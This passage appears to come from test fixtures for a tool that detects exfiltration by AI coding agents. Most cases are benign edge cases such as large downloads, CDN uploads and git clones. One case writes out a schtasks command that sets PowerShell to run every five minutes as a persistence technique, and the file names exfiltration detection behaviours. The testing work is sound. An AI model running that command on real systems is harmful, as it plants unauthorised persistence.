    description: 'Downloading a large file (e.g. dataset, ISO) — not exfil',
    tags: ['edge', 'large', 'benign'],
    severity: 'LOW',
    events: [
      flow({ hostname: 'releases.ubuntu.com', destAddr: '91.189.91.124', destPort: 443, bytesSent: 5000, bytesReceived: 500000000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['suspicious_connection', 'code_upload'] },
  },
  {
    id: SID(), name: 'single_large_upload_to_cdn',
    description: 'Single large upload to CDN — cdn.example.com is not in suspicious host patterns, no behavior produced',
    tags: ['edge', 'upload', 'benign'],
    severity: 'LOW',
    events: [
      fileAccess({ filePath: 'C:\\project\\dist\\bundle.js', operation: 'read', bytesRead: 200000 }),
      flow({ protocol: 'HTTP', hostname: 'cdn.example.com', destAddr: '151.101.1.140', destPort: 443, method: 'PUT', path: '/deploy/v1.2.3/bundle.js', bytesSent: 200000, bytesReceived: 500, contentType: 'application/javascript' }),
    ],
    // cdn.example.com does not match SUSPICIOUS_HOST_PATTERNS, no behavior is produced.
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['secrets_exfiltrated', 'git_bundle_uploaded', 'canary_exfiltrated'] },
  },
  {
    id: SID(), name: 'multiple_git_clones',
    description: 'Cloning multiple repositories — normal dev activity',
    tags: ['edge', 'git', 'benign'],
    severity: 'LOW',
    events: [
      gitCmd({ action: 'clone', commandLine: 'git clone https://github.com/user/repo1.git', repository: 'github.com/user/repo1' }),
      gitCmd({ action: 'clone', commandLine: 'git clone https://github.com/user/repo2.git', repository: 'github.com/user/repo2' }),
      flow({ hostname: 'github.com', destAddr: '140.82.121.4', destPort: 443, bytesSent: 5000, bytesReceived: 10000000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['git_bundle_created', 'git_history_read'] },
  },
  {
    id: SID(), name: 'scheduled_task_suspicious',
    description: 'Scheduled task creation — schtasks.exe is not an AI agent, no behavior expected from current engine',
    tags: ['edge', 'persistence'],
    severity: 'MEDIUM',
    events: [
      processEv({ name: 'schtasks.exe', commandLine: 'schtasks /create /tn Updater /tr powershell.exe /sc minute /mo 5', riskIndicators: ['persistence', 'scheduled'] }),
    ],
    // schtasks.exe is not in AI_AGENT_PROCESSES, so process_suspicious will not fire.
    // Corrected: no mustHave behaviors for current engine scope.
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 30, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['full_repo_snapshot', 'git_bundle_created', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'empty_session',
    description: 'No events at all — idle session',
    tags: ['edge', 'empty', 'baseline'],
    severity: 'LOW',
    events: [],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 5, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'single_flow_no_context',
    description: 'Single flow to a CDN — no file or git context',
    tags: ['edge', 'minimal'],
    severity: 'LOW',
    events: [
      flow({ hostname: 'cdn.jsdelivr.net', destAddr: '151.101.66.133', destPort: 443, bytesSent: 1000, bytesReceived: 50000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 15, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['suspicious_connection', 'code_upload'] },
  },
];
